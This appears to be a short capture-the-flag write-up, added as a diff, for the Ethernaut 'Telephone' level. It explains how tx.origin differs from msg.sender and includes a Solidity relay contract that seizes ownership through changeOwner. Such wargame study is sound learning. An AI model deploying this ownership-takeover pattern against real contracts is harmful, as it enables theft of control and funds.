@@ -1,0 +1,18 @@
+This is claimed by chained transactions.
+
+f_A(f_B(f_C()))
+^^ From the perspective of f_C(), msg.sender is f_B(), but 
+tx.rigin is f_A()
+
+So if we make a simple relay contract, we'll gain ownership
+
+Like in CoinFlip, import the Telephone contract.
+Write a function that calls the changeOwner function, and passes
+in your attacking address, ie:
+
+>> contract Relay {
+>>     function Attack(address _target) public {
+>>         Telephone telephone = Telephone(_target);
+>>         telephone.changeOwner(msg.sender);
+>>     }
+>> }
